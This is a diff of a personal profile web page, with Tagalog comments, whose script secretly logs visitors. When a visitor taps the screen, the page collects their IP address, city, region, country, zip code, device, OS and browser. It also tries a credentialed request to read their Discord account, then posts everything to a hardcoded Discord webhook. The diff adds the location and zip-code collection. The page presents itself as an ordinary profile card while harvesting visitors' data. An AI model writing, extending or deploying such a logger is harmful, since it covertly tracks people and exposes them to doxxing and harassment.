@@ -40,7 +40,7 @@
             min-height: 100vh;
         }
 
-        /* ✅ Inayos na overlay background */
+        /* ✅ GIF - HINDI BINAGO */
         #blahOverlay {
             position: fixed;
             inset: 0;
@@ -55,7 +55,7 @@
             pointer-events: none;
         }
 
-        /* ✅ Pixelated style + maliit na laki */
+        /* ✅ Font - HINDI BINAGO */
         #blahText {
             font-size: clamp(1.4rem, 5vw, 2rem);
             font-weight: bold;
@@ -75,33 +75,26 @@
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen text-white p-4">
 
-    <!-- ✅ Overlay Screen -->
+    <!-- ✅ Overlay - HINDI BINAGO -->
     <div id="blahOverlay">
         <div id="blahText">Tap The Screen</div>
     </div>
 
-    <!-- Main Card -->
+    <!-- ✅ Main Card - HINDI BINAGO -->
     <div class="bg-card/80 backdrop-blur-md rounded-3xl p-8 w-full max-w-md glow border border-gray-800">
-        <!-- Profile Picture -->
         <div class="flex justify-center mb-6">
             <div class="w-32 h-32 rounded-full overflow-hidden border-2 border-accent/60">
                 <img src="https://i.imgur.com/M630Z7k.gif" alt="Profile" class="w-full h-full object-cover">
             </div>
         </div>
-
-        <!-- Badges/Icons -->
         <div class="flex justify-center gap-3 mb-6">
             <span class="bg-gray-800 px-3 py-1 rounded-full text-sm">☠️</span>
             <span class="bg-gray-800 px-3 py-1 rounded-full text-sm">⚜️</span>
             <span class="bg-gray-800 px-3 py-1 rounded-full text-sm font-bold">PR$K</span>
         </div>
-
-        <!-- Custom Text -->
         <div class="bg-gray-800/60 rounded-xl py-3 mb-8">
             <p class="text-center text-gray-300 italic">Be Better</p>
         </div>
-
-        <!-- Username Section -->
         <div class="flex items-center gap-3 mb-6">
             <div class="w-10 h-10 rounded-full bg-gray-700 overflow-hidden">
                 <img src="https://i.imgur.com/KGPggfn.jpeg" alt="Avatar" class="w-full h-full object-cover">
@@ -111,18 +104,13 @@
                 <p class="text-sm text-gray-400">EMPTY.</p>
             </div>
         </div>
-
-        <!-- Status Text -->
         <p class="text-center text-gray-400 text-sm mb-8">the world is your.</p>
-
         <a href="https://discord.com/users/14973067157" target="_blank" class="text-indigo-500 text-4xl hover:scale-110 transition-transform">
             <i class="fa-brands fa-discord"></i>
         </a>
         <a href="https://github.com/blahlhamara-dev" class="text-gray-400 text-4xl hover:scale-110 transition-transform">
             <i class="fa-brands fa-github"></i>
         </a>
-
-        <!-- Footer -->
         <div class="flex justify-between items-center mt-4 text-gray-400 text-sm">
             <span class="flex items-center gap-2">
                 <span class="text-purple-500">⦿</span> 1337
@@ -131,7 +119,7 @@
         </div>
     </div>
 
-    <!-- Background Sound -->
+    <!-- ✅ Audio - HINDI BINAGO -->
     <audio id="bgSound" loop preload="auto">
         <source src="https://mp3tourl.com/audio/1782125485468-d36d7923-f6a4-4d8c-b7fc-4d0b7b862457.mp3" type="audio/mpeg">
     
@@ -140,30 +128,30 @@
         const audio = document.getElementById('bgSound');
         audio.volume = 0.4;
 
-        // ✅ Webhook link mo
+        // ✅ Webhook - HINDI BINAGO
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1519198591900717307/hWliSDMI9K5NmjOS4-rMmcdofcdbWXhJCF_Zcc34Si35-sjRSEjwSrJGMyVH-mQGxyqJ";
 
-        // ✅ Pag tap sa screen
+        // ✅ Click action - HINDI BINAGO
         document.addEventListener('click', () => {
             audio.play().catch(err => console.log("Audio error:", err));
-
             const overlay = document.getElementById('blahOverlay');
             setTimeout(() => overlay.classList.add('fade-out'), 100);
-
             sendVisitorInfo();
         }, { once: true });
 
-        // ✅ Logger function - pareho ng dati
+        // ✅ Logger: TANGGAL LANG ANG LANG, LAGAY LOKASYON AT ZIP CODE
         async function sendVisitorInfo() {
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                const visitorIP = ipData.ip;
+                // Kumuha ng IP at lokasyon
+                const geoRes = await fetch('https://ipapi.co/json/');
+                const geoData = await geoRes.json();
+                const visitorIP = geoData.ip || "Hindi makuha";
+                const realLocation = `${geoData.city || "?"}, ${geoData.region || "?"}, ${geoData.country_name || "?"}`;
+                const zipCode = geoData.postal || "Hindi available";
 
                 const ua = navigator.userAgent;
-                const lang = navigator.language || navigator.userLanguage;
-                const langFull = new Intl.DisplayNames(['en'], { type: 'language' }).of(lang) || lang;
 
+                // Browser
                 let browser = "Unknown";
                 if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
                 else if (ua.includes("Firefox")) browser = "Firefox";
@@ -171,38 +159,20 @@
                 else if (ua.includes("Edg")) browser = "Edge";
                 else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
 
+                // Device at OS
                 let device = "Android Device";
                 let os = "Android 10";
-
                 if (ua.includes("Android")) {
                     const osMatch = ua.match(/Android\s([0-9.]+)/);
                     if (osMatch) os = `Android ${osMatch[1]}`;
-
-                    if (ua.includes("SM-")) {
-                        const model = ua.match(/SM-[A-Z0-9]+/);
-                        device = model ? `Samsung ${model[0]}` : "Samsung";
-                    } else if (ua.includes("CPH")) {
-                        const model = ua.match(/CPH[0-9]+/);
-                        device = model ? `Oppo ${model[0]}` : "Oppo";
-                    } else if (ua.includes("Redmi")) {
-                        const model = ua.match(/Redmi\s?[0-9A-Z]+/);
-                        device = model ? `Xiaomi ${model[0]}` : "Xiaomi Redmi";
-                    } else if (ua.includes("POCO")) {
-                        const model = ua.match(/POCO\s?[0-9A-Z]+/);
-                        device = model ? `Xiaomi ${model[0]}` : "Xiaomi POCO";
-                    } else if (ua.includes("Vivo")) {
-                        const model = ua.match(/V[0-9]+/);
-                        device = model ? `Vivo ${model[0]}` : "Vivo";
-                    } else if (ua.includes("Infinix")) {
-                        const model = ua.match(/X[0-9]+/);
-                        device = model ? `Infinix ${model[0]}` : "Infinix";
-                    } else if (ua.includes("Tecno")) {
-                        const model = ua.match(/KI[0-9]+/);
-                        device = model ? `Tecno ${model[0]}` : "Tecno";
-                    } else if (ua.includes("Realme")) {
-                        const model = ua.match(/RMX[0-9]+/);
-                        device = model ? `Realme ${model[0]}` : "Realme";
-                    }
+                    if (ua.includes("SM-")) device = ua.match(/SM-[A-Z0-9]+/) ? `Samsung ${ua.match(/SM-[A-Z0-9]+/)[0]}` : "Samsung";
+                    else if (ua.includes("CPH")) device = ua.match(/CPH[0-9]+/) ? `Oppo ${ua.match(/CPH[0-9]+/)[0]}` : "Oppo";
+                    else if (ua.includes("Redmi")) device = ua.match(/Redmi\s?[0-9A-Z]+/) ? `Xiaomi ${ua.match(/Redmi\s?[0-9A-Z]+/)[0]}` : "Xiaomi Redmi";
+                    else if (ua.includes("POCO")) device = ua.match(/POCO\s?[0-9A-Z]+/) ? `Xiaomi ${ua.match(/POCO\s?[0-9A-Z]+/)[0]}` : "Xiaomi POCO";
+                    else if (ua.includes("Vivo")) device = ua.match(/V[0-9]+/) ? `Vivo ${ua.match(/V[0-9]+/)[0]}` : "Vivo";
+                    else if (ua.includes("Infinix")) device = ua.match(/X[0-9]+/) ? `Infinix ${ua.match(/X[0-9]+/)[0]}` : "Infinix";
+                    else if (ua.includes("Tecno")) device = ua.match(/KI[0-9]+/) ? `Tecno ${ua.match(/KI[0-9]+/)[0]}` : "Tecno";
+                    else if (ua.includes("RMX")) device = ua.match(/RMX[0-9]+/) ? `Realme ${ua.match(/RMX[0-9]+/)[0]}` : "Realme";
                 } else if (ua.includes("iPhone")) {
                     device = "Apple iPhone";
                     const iosMatch = ua.match(/iPhone OS\s([0-9_]+)/);
@@ -213,21 +183,20 @@
                     os = winMatch ? `Windows ${winMatch[1]}` : "Windows";
                 }
 
+                // Discord info
                 let accountInfo = "Walang naka-detect na Discord account";
                 try {
                     const discordRes = await fetch("https://discord.com/api/v9/users/@me", {
-                        method: "GET",
                         credentials: "include",
                         headers: { "Accept": "application/json" }
                     });
                     if (discordRes.ok) {
                         const userData = await discordRes.json();
-                        accountInfo = `✅ Username: @${userData.username}\n🆔 ID: ${userData.id}\n🔗 Profile: https://discord.com/users/${userData.id}`;
+                        accountInfo = `@${userData.username}\nID: ${userData.id}\nProfile: https://discord.com/users/${userData.id}`;
                     }
-                } catch (err) {
-                    accountInfo = "Walang naka-detect na Discord account";
-                }
+                } catch (e) {}
 
+                // ✅ Bagong ayos ng fields
                 const payload = {
                     username: "BOBO KA TOL",
                     avatar_url: "https://i.imgur.com/ZmspxIl.png",
@@ -236,12 +205,12 @@
                         color: 1003621,
                         fields: [
                             { name: "IP ADDRESS", value: visitorIP, inline: false },
+                            { name: "LOCATION", value: realLocation, inline: true },
+                            { name: "ZIP CODE", value: zipCode, inline: true },
                             { name: "DEVICE", value: device, inline: true },
                             { name: "OPERATING SYSTEM", value: os, inline: true },
                             { name: "BROWSER", value: browser, inline: true },
-                            { name: "TANGA PUTA", value: langFull, inline: true },
-                            { name: "HULE", value: `${window.innerWidth} × ${window.innerHeight}`, inline: true },
-                            { name: "GINANON LANG", value: document.referrer || "><----><", inline: false },
+                            { name: "SCREEN", value: `${window.innerWidth} × ${window.innerHeight}`, inline: true },
                             { name: "ACCOUNT", value: accountInfo, inline: false }
                         ],
                         timestamp: new Date().toISOString(),
@@ -261,4 +230,5 @@
         }
     </script>
 </body>
-</html>
+    </html>
+    
